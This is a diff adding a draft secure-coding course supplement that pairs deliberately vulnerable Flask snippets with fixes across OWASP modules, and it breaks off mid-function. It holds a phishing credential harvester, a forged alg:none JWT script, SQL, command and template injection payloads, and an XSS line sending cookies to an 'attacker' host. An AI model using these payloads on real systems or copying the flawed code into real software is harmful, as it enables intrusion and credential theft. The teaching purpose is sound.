@@ -1,0 +1,1436 @@
+**Flask Source-Code Security Supplement**
+
+Module-by-Module Companion to the
+
+**Secure Web Application Development (2-Day) Course**
+
+*BBC Academy / JBI Training \| Draft v1.0*
+
+**Purpose & Design Philosophy**
+
+OWASP Juice Shop is an outstanding black-box target that puts delegates
+in the attacker\'s seat. This Flask supplement adds a complementary
+dimension: the developer\'s seat. By reading, running, breaking, and
+fixing minimal Flask applications alongside each module, delegates gain
+source-code literacy that Juice Shop alone cannot provide.
+
+**Each supplement entry below follows a consistent structure:**
+
+-   Learning objective --- what the Flask demo adds over Juice Shop
+
+-   Delivery mode --- instructor demo, delegate practical, or group
+    discussion
+
+-   Suggested timing --- additional minutes within the existing slot
+
+-   Vulnerable code --- the deliberately broken Flask snippet
+
+-   Fixed code --- the corrected version with annotations
+
+-   Discussion prompts --- questions to anchor the debrief
+
++-----------------------------------------------------------------------+
+| **⚙️ Infrastructure Note**                                            |
+|                                                                       |
+| Flask and its dependencies (flask, flask-sqlalchemy, bcrypt,          |
+| flask-jwt-extended) install in under 60 seconds on the existing       |
+| Ubuntu VMs: pip3 install flask flask-sqlalchemy bcrypt                |
+| flask-jwt-extended. No VM image changes are required for              |
+| instructor-led demos. For delegate practicals, a pre-built            |
+| \"vuln_flask_app\" directory can be placed on each VM during          |
+| provisioning.                                                         |
++-----------------------------------------------------------------------+
+
+**Module 1 --- Introductions & Lab Orientation**
+
+No Flask exercise is appropriate here. Use this module to plant the seed
+by mentioning Flask briefly in your opening preview: \"Throughout today
+and tomorrow, alongside Juice Shop, you\'ll be reading short Flask
+applications --- seeing the same vulnerabilities we\'ll exploit in the
+source code that created them.\"
+
++-----------------------------------------------------------------------+
+| **💡 Framing suggestion for Module 1**                                |
+|                                                                       |
+| Ask delegates during the opening quiz: \"When you fix a security bug, |
+| what do you actually change?\" Most will answer in terms of           |
+| configuration or tooling. This surfaces the gap that Flask demos will |
+| fill --- the code itself.                                             |
++-----------------------------------------------------------------------+
+
+**Module 2 --- Understanding Web Applications**
+
+  -----------------------------------------------------------------------
+  **Field**           **Detail**
+  ------------------- ---------------------------------------------------
+  **OWASP mapping**   Foundation (not a Top 10 item --- underpins all of
+                      them)
+
+  **Delivery mode**   Instructor live demo (\~8 mins)
+
+  **Timing**          Replaces or accompanies the ZAP introduction
+
+  **What Flask adds** Shows exactly how HTTP headers, cookies and
+                      response bodies are constructed server-side ---
+                      demystifying what ZAP captures
+  -----------------------------------------------------------------------
+
+**Learning Objective**
+
+Delegates see a web application from both sides simultaneously: ZAP
+shows the HTTP traffic, Flask shows the 10 lines of Python that produced
+it. This dual view builds a mental model that purely black-box tools
+cannot create.
+
+**Demo: A Minimal Flask App as a Teaching Mirror**
+
+Run this app alongside ZAP. Open ZAP\'s history panel, hit each route in
+Firefox, and narrate what ZAP shows against what the Flask code does.
+
+**app.py --- instructor demo application**
+
+> from flask import Flask, request, make_response,
+> render_template_string
+>
+> import secrets
+>
+> app = Flask(\_\_name\_\_)
+>
+> \# Route 1: Illustrates a plain GET response and response headers
+>
+> \@app.route(\"/\")
+>
+> def index():
+>
+> resp = make_response(\"\<h1\>Welcome\</h1\>\<p\>Check ZAP --- what
+> headers do you see?\</p\>\")
+>
+> resp.headers\[\"X-Content-Type-Options\"\] = \"nosniff\"
+>
+> resp.headers\[\"X-Frame-Options\"\] = \"DENY\"
+>
+> \# Deliberately OMIT Content-Security-Policy here --- ask delegates to
+> spot it
+>
+> return resp
+>
+> \# Route 2: Shows how a cookie is created and what its flags mean
+>
+> \@app.route(\"/login\", methods=\[\"POST\"\])
+>
+> def login():
+>
+> resp = make_response(\"Logged in\")
+>
+> resp.set_cookie(
+>
+> \"session_id\",
+>
+> value=secrets.token_hex(16),
+>
+> httponly=True, \# Not accessible via JavaScript
+>
+> secure=False, \# ← deliberately False for classroom HTTP; discuss why
+> HTTPS matters
+>
+> samesite=\"Lax\"
+>
+> )
+>
+> return resp
+>
+> \# Route 3: Shows POST body parsing --- link to what ZAP\'s request
+> tab shows
+>
+> \@app.route(\"/submit\", methods=\[\"POST\"\])
+>
+> def submit():
+>
+> data = request.form.get(\"username\", \"nobody\")
+>
+> return f\"\<p\>You sent: {data}\</p\>\" \# ← XSS is HERE --- revisit
+> in Module 9
+>
+> if \_\_name\_\_ == \"\_\_main\_\_\":
+>
+> app.run(debug=True, port=5000)
+
+**Discussion Prompts**
+
+-   Which response headers is Flask adding automatically? Which are
+    missing?
+
+-   In Route 3, the username is echoed directly into HTML. What could go
+    wrong? (Flag this --- you will return to it in Module 9.)
+
+-   What does httponly=True actually prevent? Find the proof in ZAP\'s
+    cookie details.
+
+**Module 3 --- Information Security & Cybersecurity Fundamentals**
+
+  -----------------------------------------------------------------------
+  **Field**           **Detail**
+  ------------------- ---------------------------------------------------
+  **OWASP mapping**   A01 Broken Access Control (credential harvesting
+                      context)
+
+  **Delivery mode**   Instructor demo only --- ethical/legal framing
+                      essential
+
+  **Timing**          \~5 mins alongside BeEF/SE Toolkit demo
+
+  **What Flask adds** Shows that a phishing credential harvester is
+                      trivially simple to build --- shifting the
+                      conversation from \"sophisticated attack\" to
+                      \"this is 15 lines of Python\"
+  -----------------------------------------------------------------------
+
+**Learning Objective**
+
+Delegates understand that the technical barrier to credential phishing
+is extremely low. The sophistication lies in social engineering, not the
+server code. This reframes how they think about training users and
+building detection controls.
+
++-----------------------------------------------------------------------+
+| **⚠️ Ethical & Legal Framing --- State this explicitly before showing |
+| the code**                                                            |
+|                                                                       |
+| This code is shown purely to illustrate why user-awareness training   |
+| matters. Running this against any real users or infrastructure        |
+| without explicit written authorisation is illegal under the Computer  |
+| Misuse Act 1990. It is only being demonstrated here within our closed |
+| lab environment.                                                      |
++-----------------------------------------------------------------------+
+
+**Demo: A 15-Line Credential Harvester**
+
+**harvester.py --- instructor demo only (never leave on delegate VMs)**
+
+> from flask import Flask, request
+>
+> app = Flask(\_\_name\_\_)
+>
+> captured = \[\]
+>
+> \@app.route(\"/\", methods=\[\"GET\", \"POST\"\])
+>
+> def phish():
+>
+> if request.method == \"POST\":
+>
+> captured.append({
+>
+> \"username\": request.form.get(\"username\"),
+>
+> \"password\": request.form.get(\"password\"),
+>
+> \"ip\": request.remote_addr
+>
+> })
+>
+> print(f\"\[CAPTURED\] {captured\[-1\]}\") \# In a real attack: exfil
+> to attacker server
+>
+> return \"Login failed. Please try again.\" \# Convincing failure
+> message
+>
+> return open(\"fake_login.html\").read() \# Cloned login page
+>
+> if \_\_name\_\_ == \"\_\_main\_\_\":
+>
+> app.run(port=8080)
+
+**Discussion Prompts**
+
+-   How many lines of code does it take to build a working credential
+    harvester?
+
+-   What would the HTTP traffic look like in ZAP? How would you
+    distinguish it from a legitimate login?
+
+-   What controls could detect or prevent this being reached by BBC
+    staff? (Email filtering, DNS sinkholes, certificate checking, FIDO2
+    keys.)
+
+**Module 4 --- Introducing WebAppSec Good Practices**
+
+  -----------------------------------------------------------------------
+  **Field**           **Detail**
+  ------------------- ---------------------------------------------------
+  **OWASP mapping**   Multiple --- used as a \"spot the category\"
+                      mapping exercise
+
+  **Delivery mode**   Group exercise --- delegates read printed source
+                      and categorise findings
+
+  **Timing**          15--20 mins as the practical activity replacing or
+                      extending the VM lab task
+
+  **What Flask adds** Provides a tangible code artefact to attach OWASP
+                      category labels to --- converting abstract taxonomy
+                      into concrete recognition skills
+  -----------------------------------------------------------------------
+
+**Learning Objective**
+
+After reading this single Flask application, delegates can map at least
+five OWASP Top 10:2025 categories to specific lines of code. This is the
+reverse of normal training: instead of learning categories then finding
+examples, delegates find the problems first and then discover which
+category owns them.
+
+**Exercise: \"OWASP Bingo\" --- Find the Categories**
+
+Print the code below (or share via shared screen). Give delegates 10
+minutes to annotate it with OWASP category labels before revealing the
+answers. Works especially well with mixed-ability groups because
+developers spot code issues while testers and sysadmins often spot
+configuration and design issues.
+
+**vulnerable_shop.py --- contains 8 deliberate flaws. Can you name them
+all?**
+
+> from flask import Flask, request, session, jsonify
+>
+> import sqlite3, os, hashlib
+>
+> app = Flask(\_\_name\_\_)
+>
+> app.secret_key = \"password\" \# Flaw 1
+>
+> app.config\[\"DEBUG\"\] = True \# Flaw 2
+>
+> def get_db():
+>
+> return sqlite3.connect(\"shop.db\")
+>
+> \@app.route(\"/login\", methods=\[\"POST\"\])
+>
+> def login():
+>
+> username = request.form\[\"username\"\]
+>
+> password = request.form\[\"password\"\]
+>
+> pw_hash = hashlib.md5(password.encode()).hexdigest() \# Flaw 3
+>
+> db = get_db()
+>
+> \# Flaw 4 --- raw string interpolation in SQL
+>
+> row = db.execute(f\"SELECT \* FROM users WHERE username=\'{username}\'
+> AND password_hash=\'{pw_hash}\'\").fetchone()
+>
+> if row:
+>
+> session\[\"user\"\] = username \# Flaw 5 --- stores username not
+> user_id
+>
+> return jsonify({\"status\": \"ok\"})
+>
+> return jsonify({\"status\": \"fail\"}), 401
+>
+> \@app.route(\"/profile\")
+>
+> def profile(): \# Flaw 6 --- no authentication check
+>
+> user_id = request.args.get(\"user_id\") \# Flaw 7 --- IDOR
+>
+> db = get_db()
+>
+> row = db.execute(f\"SELECT \* FROM users WHERE
+> id={user_id}\").fetchone()
+>
+> return jsonify(dict(zip(\[d\[0\] for d in db.description\], row)))
+>
+> \@app.route(\"/ping\")
+>
+> def ping():
+>
+> host = request.args.get(\"host\", \"localhost\")
+>
+> result = os.popen(f\"ping -c 1 {host}\").read() \# Flaw 8 --- command
+> injection
+>
+> return f\"\<pre\>{result}\</pre\>\"
+>
+> if \_\_name\_\_ == \"\_\_main\_\_\":
+>
+> app.run()
+
+**Answer Key --- OWASP Top 10:2025 Mapping**
+
+-   Flaw 1 --- A02 Cryptographic Failures: Hardcoded, trivial secret key
+    allows session forgery
+
+-   Flaw 2 --- A05 Security Misconfiguration: DEBUG=True in code means
+    it can reach production
+
+-   Flaw 3 --- A02 Cryptographic Failures: MD5 is a broken hashing
+    algorithm for passwords
+
+-   Flaw 4 --- A03 Injection: Raw f-string SQL --- classic SQLi vector
+
+-   Flaw 5 --- A07 Identification & Authentication Failures: Session
+    stores mutable username, not immutable user ID
+
+-   Flaw 6 --- A01 Broken Access Control: Route has no \@login_required
+    or session check
+
+-   Flaw 7 --- A01 Broken Access Control: IDOR --- any user_id can be
+    queried by any caller
+
+-   Flaw 8 --- A03 Injection: Command injection via os.popen with
+    unsanitised user input
+
+**Module 5 --- Secure Web App Development Lifecycles & Supporting
+Tools**
+
+  -----------------------------------------------------------------------
+  **Field**           **Detail**
+  ------------------- ---------------------------------------------------
+  **OWASP mapping**   ASVS, SSDLC (Microsoft SDL / OpenSAMM)
+
+  **Delivery mode**   Instructor-led discussion using printed
+                      requirements.txt
+
+  **Timing**          \~8 mins within the breakout group SSDLC review
+
+  **What Flask adds** Makes abstract SSDLC stages tangible by showing
+                      what each stage would catch in the
+                      vulnerable_shop.py from Module 4
+  -----------------------------------------------------------------------
+
+**Learning Objective**
+
+Delegates map SSDLC stages to the specific flaws identified in Module 4,
+reinforcing that security is not a single checkpoint but a sequence of
+gates --- each of which would have caught different issues.
+
+**Exercise: Which SSDLC Stage Catches Which Flaw?**
+
+Using the 8 flaws from Module 4\'s vulnerable_shop.py, challenge
+breakout groups to assign each flaw to the earliest SSDLC stage that
+could have caught it:
+
+-   Requirements / Threat Modelling: Flaws 6 & 7 (missing access control
+    design) --- a threat model asking \"what if an attacker guesses
+    another user\'s ID?\" would surface these before a line of code is
+    written
+
+-   Secure Coding Standards: Flaws 3 & 4 (MD5, raw SQL) --- a coding
+    standard mandating bcrypt and parameterised queries catches these at
+    the PR review stage
+
+-   SAST (Static Analysis): Flaws 4 & 8 (SQLi, command injection) ---
+    tools like Bandit for Python flag os.popen() and string-interpolated
+    SQL automatically
+
+-   Configuration Review: Flaws 1 & 2 (hardcoded secret, DEBUG) --- a
+    pre-deployment checklist or secrets scanner (e.g. git-secrets,
+    truffleHog) catches these
+
+-   DAST / Penetration Test: Flaw 5 (session design flaw) --- only
+    observable through runtime testing of session behaviour
+
+**Supply Chain Note --- requirements.txt**
+
+Briefly show delegates the difference between a pinned and unpinned
+requirements.txt to anchor the A03 Software Supply Chain Failures
+category:
+
+**requirements.txt --- UNSAFE (unpinned)**
+
+> flask
+>
+> requests
+>
+> sqlalchemy
+
+**requirements.txt --- SAFER (pinned with hash verification)**
+
+> flask==3.1.0 \\
+>
+> \--hash=sha256:5f873c5184c897c8d9d1b05df1e3d01b14910ce69607a117bd3277098a5836ac
+>
+> requests==2.31.0 \\
+>
+> \--hash=sha256:942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1
+
+**Module 6 --- A01 Broken Access Control & A07 Authentication Failures**
+
+  -----------------------------------------------------------------------
+  **Field**           **Detail**
+  ------------------- ---------------------------------------------------
+  **OWASP mapping**   A01 Broken Access Control, A07 Identification &
+                      Authentication Failures
+
+  **Delivery mode**   Delegate practical (\~20 mins) --- run the
+                      vulnerable app on VM, exploit, then apply the fix
+
+  **Timing**          This is the richest practical of Day 1 --- plan for
+                      the full practical slot
+
+  **What Flask adds** Delegates both exploit and fix an authentication
+                      system, experiencing both attacker and developer
+                      perspectives within a single exercise
+  -----------------------------------------------------------------------
+
+**Learning Objective**
+
+Delegates exploit three distinct access control weaknesses in a running
+Flask app, then apply the corresponding code fixes and verify that their
+exploit no longer works. The act of breaking one\'s own fix is powerful
+--- it confirms understanding rather than just procedure-following.
+
+**Weakness 1: IDOR (Insecure Direct Object Reference)**
+
+**VULNERABLE --- profile route uses attacker-controlled user_id**
+
+> \@app.route(\"/api/profile\")
+>
+> def get_profile():
+>
+> \# BUG: user_id comes from the request, not from the authenticated
+> session
+>
+> user_id = request.args.get(\"user_id\")
+>
+> user = db.session.get(User, user_id)
+>
+> return jsonify(user.to_dict())
+
+**FIXED --- user_id is always taken from the server-side session**
+
+> \@app.route(\"/api/profile\")
+>
+> \@login_required \# Flask-Login decorator
+>
+> def get_profile():
+>
+> \# FIX: only the authenticated user\'s own profile is accessible
+>
+> user = db.session.get(User, current_user.id)
+>
+> return jsonify(user.to_dict())
+
+**Weakness 2: JWT Algorithm Confusion (alg:none attack)**
+
+**VULNERABLE --- accepts tokens signed with algorithm \"none\"**
+
+> import jwt
+>
+> \@app.route(\"/admin\")
+>
+> def admin():
+>
+> token = request.headers.get(\"Authorization\", \"\").replace(\"Bearer
+> \", \"\")
+>
+> \# BUG: algorithms not restricted --- attacker can forge a token with
+> alg:none
+>
+> payload = jwt.decode(token, options={\"verify_signature\": False})
+>
+> if payload.get(\"role\") == \"admin\":
+>
+> return \"Welcome, admin!\"
+>
+> return \"Forbidden\", 403
+
+**Exploit --- generate a forged admin token in Python (show in ZAP)**
+
+> import base64, json
+>
+> header =
+> base64.urlsafe_b64encode(json.dumps({\"alg\":\"none\",\"typ\":\"JWT\"}).encode()).rstrip(b\"=\").decode()
+>
+> payload =
+> base64.urlsafe_b64encode(json.dumps({\"role\":\"admin\",\"sub\":\"attacker\"}).encode()).rstrip(b\"=\").decode()
+>
+> forged = f\"{header}.{payload}.\" \# Empty signature --- accepted by
+> vulnerable code
+>
+> print(forged)
+
+**FIXED --- allowlist of accepted algorithms, signature always
+verified**
+
+> \@app.route(\"/admin\")
+>
+> def admin():
+>
+> token = request.headers.get(\"Authorization\", \"\").replace(\"Bearer
+> \", \"\")
+>
+> try:
+>
+> \# FIX: explicit algorithm allowlist; SECRET_KEY loaded from
+> environment
+>
+> payload = jwt.decode(token, app.config\[\"SECRET_KEY\"\],
+> algorithms=\[\"HS256\"\])
+>
+> except jwt.InvalidTokenError:
+>
+> return \"Invalid token\", 401
+>
+> if payload.get(\"role\") == \"admin\":
+>
+> return \"Welcome, admin!\"
+>
+> return \"Forbidden\", 403
+
+**Weakness 3: Session Cookie Containing Role**
+
+**VULNERABLE --- client-side cookie determines privilege level**
+
+> \@app.route(\"/login\", methods=\[\"POST\"\])
+>
+> def login():
+>
+> \# BUG: role stored in client-visible cookie --- trivially modified
+>
+> resp = make_response(\"OK\")
+>
+> resp.set_cookie(\"role\", \"user\") \# Attacker changes this to
+> \"admin\" in DevTools
+>
+> return resp
+>
+> \@app.route(\"/dashboard\")
+>
+> def dashboard():
+>
+> if request.cookies.get(\"role\") == \"admin\":
+>
+> return \"Admin dashboard\"
+>
+> return \"User dashboard\"
+
+**FIXED --- authoritative role stored in server-side session only**
+
+> \@app.route(\"/login\", methods=\[\"POST\"\])
+>
+> def login():
+>
+> user = authenticate(request.form\[\"username\"\],
+> request.form\[\"password\"\])
+>
+> if user:
+>
+> session\[\"user_id\"\] = user.id \# Server-side session; role looked
+> up from DB each request
+>
+> return \"OK\"
+>
+> return \"Forbidden\", 403
+>
+> \@app.route(\"/dashboard\")
+>
+> \@login_required
+>
+> def dashboard():
+>
+> if current_user.role == \"admin\": \# Role authoritative from
+> database, never from client
+>
+> return \"Admin dashboard\"
+>
+> return \"User dashboard\"
+
+**Module 7 --- A02 Security Misconfiguration & A03 Software Supply Chain
+Failures**
+
+  -----------------------------------------------------------------------
+  **Field**           **Detail**
+  ------------------- ---------------------------------------------------
+  **OWASP mapping**   A02 Security Misconfiguration, A03 Software Supply
+                      Chain Failures
+
+  **Delivery mode**   Instructor demo (Werkzeug debugger) + delegate
+                      OSINT exercise
+
+  **Timing**          \~10 mins demo; OSINT exercise runs concurrently
+                      with existing activities
+
+  **What Flask adds** The Werkzeug interactive debugger provides a
+                      visceral demonstration of why debug=True in
+                      production is a critical misconfiguration --- it
+                      grants RCE to any browser
+  -----------------------------------------------------------------------
+
+**Demo: Werkzeug Debugger = Remote Code Execution**
+
+Start the vulnerable app with debug=True. Navigate to a route that
+raises an exception. Show delegates that the interactive debugger allows
+arbitrary Python execution --- including reading /etc/passwd, listing
+files, or opening a reverse shell.
+
+**VULNERABLE --- debug mode enabled, secret key hardcoded**
+
+> app = Flask(\_\_name\_\_)
+>
+> app.secret_key = \"dev\" \# Hardcoded --- in git history forever
+>
+> app.config\[\"DEBUG\"\] = True \# Never allow this in any environment
+> reachable from a network
+>
+> \@app.route(\"/crash\")
+>
+> def crash():
+>
+> raise Exception(\"Oops\") \# Werkzeug debugger opens --- show
+> delegates the console PIN bypass
+
+**FIXED --- configuration from environment, debug off by default**
+
+> import os
+>
+> app = Flask(\_\_name\_\_)
+>
+> app.secret_key = os.environ\[\"FLASK_SECRET_KEY\"\] \# Injected at
+> runtime; never in source
+>
+> app.config\[\"DEBUG\"\] = os.environ.get(\"FLASK_DEBUG\",
+> \"false\").lower() == \"true\"
+>
+> \# Production startup: FLASK_SECRET_KEY=\$(openssl rand -hex 32)
+> gunicorn app:app
+>
+> \# Development startup: FLASK_DEBUG=true FLASK_SECRET_KEY=dev flask
+> run
+
+**Supply Chain --- Dependency Confusion Demo**
+
+Show pip install of a package with no version pin, then show how pip
+audit flags known CVEs. This directly supports the A03 category without
+requiring any additional infrastructure.
+
+> \# Install pip-audit on the delegate VMs (or run as instructor demo)
+>
+> pip3 install pip-audit
+>
+> \# Audit a deliberately outdated requirements.txt
+>
+> pip-audit -r requirements_vulnerable.txt
+>
+> \# Expected output: lists CVEs for outdated Flask, Werkzeug, Jinja2
+> versions
+
+**Module 8 --- A04 Cryptographic Failures & A08 Software & Data
+Integrity Failures**
+
+  -----------------------------------------------------------------------
+  **Field**           **Detail**
+  ------------------- ---------------------------------------------------
+  **OWASP mapping**   A04 Cryptographic Failures, A08 Software & Data
+                      Integrity Failures
+
+  **Delivery mode**   Delegate practical --- run HashCat against MD5
+                      hashes extracted from a Flask SQLite DB
+
+  **Timing**          \~20 mins --- integrates naturally with existing
+                      HashCat activity
+
+  **What Flask adds** Closes the loop between the HashCat cracking
+                      exercise and the code that produced the weak hashes
+                      --- delegates can then apply the bcrypt fix
+                      themselves
+  -----------------------------------------------------------------------
+
+**Part A: Password Storage --- From Plaintext to bcrypt**
+
+**VULNERABLE --- MD5 password hashing (already in vulnerable_shop.py
+from Module 4)**
+
+> import hashlib
+>
+> def hash_password(password: str) -\> str:
+>
+> return hashlib.md5(password.encode()).hexdigest() \# MD5: broken,
+> fast, rainbow-tabled
+>
+> \# Cracked in seconds:
+>
+> \# hashcat -m 0 hashes.txt rockyou.txt
+
+**FIXED --- bcrypt with appropriate work factor**
+
+> import bcrypt
+>
+> def hash_password(password: str) -\> bytes:
+>
+> return bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
+>
+> \# rounds=12 means 2\^12 iterations --- deliberately slow for an
+> attacker, fast enough for a user
+>
+> def check_password(password: str, stored_hash: bytes) -\> bool:
+>
+> return bcrypt.checkpw(password.encode(), stored_hash)
+>
+> \# hashcat against bcrypt: hours to days on commodity hardware vs
+> milliseconds for MD5
+
+**Part B: Data Integrity --- Hidden Field Tampering**
+
+Flask\'s signed cookies protect session data, but many applications pass
+sensitive values (prices, scores, user IDs) in hidden form fields or URL
+parameters that are trivially modified. This exercise connects directly
+to the Juice Shop price manipulation challenge.
+
+**VULNERABLE --- price trusted from hidden form field**
+
+> \@app.route(\"/checkout\", methods=\[\"POST\"\])
+>
+> def checkout():
+>
+> \# BUG: price comes from the browser --- an attacker sets it to 0.01
+> in DevTools
+>
+> price = float(request.form\[\"price\"\])
+>
+> item_id = request.form\[\"item_id\"\]
+>
+> quantity = int(request.form\[\"quantity\"\])
+>
+> total = price \* quantity
+>
+> charge_customer(total)
+>
+> return f\"Charged £{total:.2f}\"
+
+**FIXED --- price always looked up server-side from trusted source**
+
+> \@app.route(\"/checkout\", methods=\[\"POST\"\])
+>
+> \@login_required
+>
+> def checkout():
+>
+> \# FIX: only item_id and quantity come from the browser
+>
+> item_id = request.form\[\"item_id\"\]
+>
+> quantity = int(request.form\[\"quantity\"\])
+>
+> \# Price is authoritative from the database --- never trusted from
+> client
+>
+> item = db.session.get(Item, item_id)
+>
+> total = item.price \* quantity
+>
+> charge_customer(total)
+>
+> return f\"Charged £{total:.2f}\"
+
+**Discussion Prompts**
+
+-   After cracking the MD5 hashes with HashCat --- how long would bcrypt
+    have taken? (Answer: demonstrate with a timing test: python3 -c
+    \"import bcrypt, time; t=time.time(); bcrypt.hashpw(b\'password\',
+    bcrypt.gensalt(12)); print(time.time()-t)\")
+
+-   The checkout fix still trusts item_id from the browser. What could
+    go wrong with that? (Answer: leads naturally into IDOR if item_id
+    allows access to items the user cannot see.)
+
+**Module 9 --- A05 Injection**
+
+  -----------------------------------------------------------------------
+  **Field**           **Detail**
+  ------------------- ---------------------------------------------------
+  **OWASP mapping**   A05 Injection (SQLi, XSS, Command Injection, SSTI)
+
+  **Delivery mode**   Delegate practical --- four distinct injection
+                      types, each with vulnerable code, exploit, and fix
+
+  **Timing**          This is the richest Flask module --- plan for the
+                      full 60-minute practical slot
+
+  **What Flask adds** Jinja2\'s template injection (SSTI) is a
+                      Flask-specific vulnerability that Juice Shop does
+                      not demonstrate. The source/fix pairing for all
+                      four types in one framework gives developers a
+                      unified mental model.
+  -----------------------------------------------------------------------
+
+**Injection Type 1: SQL Injection**
+
+**VULNERABLE**
+
+> \@app.route(\"/search\")
+>
+> def search():
+>
+> q = request.args.get(\"q\", \"\")
+>
+> \# Payload: \' OR \'1\'=\'1
+>
+> rows = db.execute(f\"SELECT \* FROM products WHERE name LIKE
+> \'%{q}%\'\").fetchall()
+>
+> return jsonify(\[dict(r) for r in rows\])
+
+**FIXED**
+
+> \@app.route(\"/search\")
+>
+> def search():
+>
+> q = request.args.get(\"q\", \"\")
+>
+> rows = db.execute(\"SELECT \* FROM products WHERE name LIKE ?\",
+> (f\"%{q}%\",)).fetchall()
+>
+> return jsonify(\[dict(r) for r in rows\])
+
+**Injection Type 2: Cross-Site Scripting (XSS)**
+
+Jinja2 auto-escapes variables by default. The vulnerability arises when
+developers override this with the \|safe filter or
+render_template_string with unsanitised input.
+
+**VULNERABLE --- \|safe filter disables auto-escaping**
+
+> \# In Jinja2 template:
+>
+> \# Payload:
+> \<script\>document.location=\'http://attacker/?\'+document.cookie\</script\>
+>
+> \<p\>Hello, {{ username \| safe }}!\</p\> {# \|safe tells Jinja2 NOT
+> to escape #}
+>
+> \# Also vulnerable: render_template_string with user input
+>
+> \@app.route(\"/greet\")
+>
+> def greet():
+>
+> name = request.args.get(\"name\", \"world\")
+>
+> return render_template_string(f\"\<h1\>Hello {name}\</h1\>\") \# XSS
+> AND SSTI
+
+**FIXED --- rely on Jinja2 auto-escaping; never use \|safe on user
+input**
+
+> \# In Jinja2 template:
+>
+> \<p\>Hello, {{ username }}!\</p\> {# No \|safe --- Jinja2 escapes \<
+> \> & \" \' automatically #}
+>
+> \# Use render_template with a separate file, never
+> render_template_string with user data
+>
+> \@app.route(\"/greet\")
+>
+> def greet():
+>
+> name = request.args.get(\"name\", \"world\")
+>
+> return render_template(\"greet.html\", name=name) \# name auto-escaped
+> in template
+
+**Injection Type 3: Server-Side Template Injection (SSTI)**
+
+SSTI is a Flask/Jinja2-specific injection class that Juice Shop does not
+cover. It occurs when user-supplied strings are passed to
+render_template_string() and is frequently more severe than XSS --- it
+can lead to full remote code execution.
+
+**VULNERABLE --- user input evaluated as Jinja2 template**
+
+> \@app.route(\"/preview\")
+>
+> def preview():
+>
+> template = request.args.get(\"t\", \"Hello\")
+>
+> \# Payload: {{7\*7}} returns 49 --- template is being evaluated
+>
+> \# RCE payload:
+> {{config.\_\_class\_\_.\_\_init\_\_.\_\_globals\_\_\[\'os\'\].popen(\'id\').read()}}
+>
+> return render_template_string(template)
+
+**FIXED --- never pass user input to render_template_string**
+
+> \# There is no safe way to render user-supplied Jinja2 templates.
+>
+> \# If dynamic templates are required, use a sandboxed engine (e.g.
+> Jinja2 SandboxedEnvironment)
+>
+> \# or restrict input to a strict allowlist of known-safe template
+> identifiers.
+>
+> from jinja2.sandbox import SandboxedEnvironment
+>
+> sandbox = SandboxedEnvironment()
+>
+> \@app.route(\"/preview\")
+>
+> def preview():
+>
+> template = request.args.get(\"t\", \"Hello\")
+>
+> return sandbox.from_string(template).render() \# Sandboxed --- still
+> not recommended for production
+
+**Injection Type 4: Command Injection**
+
+**VULNERABLE --- unsanitised input passed to shell**
+
+> import os
+>
+> \@app.route(\"/ping\")
+>
+> def ping():
+>
+> host = request.args.get(\"host\", \"localhost\")
+>
+> \# Payload: 127.0.0.1; cat /etc/passwd
+>
+> output = os.popen(f\"ping -c 1 {host}\").read()
+>
+> return f\"\<pre\>{output}\</pre\>\"
+
+**FIXED --- subprocess with shell=False and an allowlisted input**
+
+> import subprocess, re
+>
+> \@app.route(\"/ping\")
+>
+> def ping():
+>
+> host = request.args.get(\"host\", \"localhost\")
+>
+> \# Allowlist: only valid hostname/IP characters
+>
+> if not re.fullmatch(r\'\[a-zA-Z0-9.-\]+\', host):
+>
+> return \"Invalid host\", 400
+>
+> result = subprocess.run(\[\"ping\", \"-c\", \"1\", host\], \#
+> shell=False: no shell metacharacters
+>
+> capture_output=True, text=True, timeout=5)
+>
+> return f\"\<pre\>{result.stdout}\</pre\>\"
+
+**Module 10 --- A06 Insecure Design & A10 Mishandling of Exceptional
+Conditions**
+
+  -----------------------------------------------------------------------
+  **Field**           **Detail**
+  ------------------- ---------------------------------------------------
+  **OWASP mapping**   A06 Insecure Design, A10 Mishandling of Exceptional
+                      Conditions
+
+  **Delivery mode**   Group threat modelling exercise using Flask app as
+                      the system to model
+
+  **Timing**          \~15 mins for the threat model exercise; code
+                      snippets used as supporting illustrations
+
+  **What Flask adds** Provides a concrete, code-level system description
+                      for threat modelling --- far more realistic than a
+                      whiteboard diagram
+  -----------------------------------------------------------------------
+
+**Insecure Design: Rate Limiting and Account Enumeration**
+
+Two design flaws that are invisible at the code level but obvious at the
+design level --- reinforcing that A06 is about decisions made before
+coding begins.
+
+**VULNERABLE --- no rate limiting, account enumeration via error
+message**
+
+> \@app.route(\"/login\", methods=\[\"POST\"\])
+>
+> def login():
+>
+> user =
+> User.query.filter_by(username=request.form\[\"username\"\]).first()
+>
+> if not user:
+>
+> return \"User not found\", 401 \# BUG: different message reveals
+> whether account exists
+>
+> if not check_password(request.form\[\"password\"\],
+> user.password_hash):
+>
+> return \"Wrong password\", 401 \# BUG: attacker now knows account
+> exists
+>
+> \# No rate limiting: unlimited login attempts
+>
+> return \"OK\"
+
+**FIXED --- consistent error message, Flask-Limiter rate control**
+
+> from flask_limiter import Limiter
+>
+> from flask_limiter.util import get_remote_address
+>
+> limiter = Limiter(app, key_func=get_remote_address)
+>
+> \@app.route(\"/login\", methods=\[\"POST\"\])
+>
+> \@limiter.limit(\"5 per minute\") \# Rate limit: 5 attempts per minute
+> per IP
+>
+> def login():
+>
+> user =
+> User.query.filter_by(username=request.form\[\"username\"\]).first()
+>
+> \# FIX: identical error message whether user exists or not
+>
+> if not user or not check_password(request.form\[\"password\"\],
+> user.password_hash):
+>
+> return \"Invalid credentials\", 401
+>
+> return \"OK\"
+
+**Exceptional Conditions: Stack Traces in Production**
+
+**VULNERABLE --- unhandled exception leaks internal paths and library
+versions**
+
+> \# With debug=False but no error handler, Flask returns a generic 500
+> page
+>
+> \# BUT with debug=True (common in staging/UAT), full stack trace is
+> returned:
+>
+> \# Traceback \... File \"/home/ubuntu/app/models.py\", line 47, in
+> get_user
+>
+> \# sqlalchemy.exc.OperationalError: (sqlite3.OperationalError) no such
+> table: users
+>
+> \# Reveals: framework versions, file paths, database type, table names
+
+**FIXED --- custom error handlers return safe, generic responses**
+
+> import logging
+>
+> \@app.errorhandler(500)
+>
+> def internal_error(error):
+>
+> app.logger.error(f\"500 error: {error}\", exc_info=True) \# Full
+> detail goes to log only
+>
+> return jsonify({\"error\": \"An internal error occurred. Reference:
+> see server logs.\"}), 500
+>
+> \@app.errorhandler(404)
+>
+> def not_found(error):
+>
